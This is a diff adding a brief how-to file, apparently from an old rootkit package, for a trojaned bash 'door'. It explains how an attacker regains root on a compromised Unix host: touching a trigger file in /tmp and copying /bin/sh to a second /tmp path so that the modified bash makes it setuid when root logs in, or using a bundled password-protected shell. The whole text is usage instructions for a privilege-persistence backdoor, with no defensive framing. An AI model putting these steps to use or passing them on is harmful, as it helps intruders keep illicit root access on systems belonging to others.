@@ -1,0 +1,22 @@
+How-To Use the Bash door.
+
+To get root privileges back you need two files to exist.
+
+These files act like a password.
+
+/tmp/mcliZokhb - if Exist then :
+/tmp/mclzaKmfa - program to be set +s
+
+What we do here is make a file "touch" called /tmp/mcliZokhb
+and either copy /bin/sh to /tmp/mclzaKmfa, or use Trogan to make
+a secure password protected shell. 
+
+Bash will set /tmp/mclzaKmfa suid when /tmp/mcliZokhb exists.
+If /tmp/mcliZokhb doesnt exist then bash will do nothing.
+
+WARNING: It is very unsafe to leave a suid shell in /tmp, where
+any user can run it! So use the one supplied with Trogan called
+SeCshell.
+
+This backdoor has one flaw. The backdoor will only work when a user 
+with uid/gid 0(root) logs in.
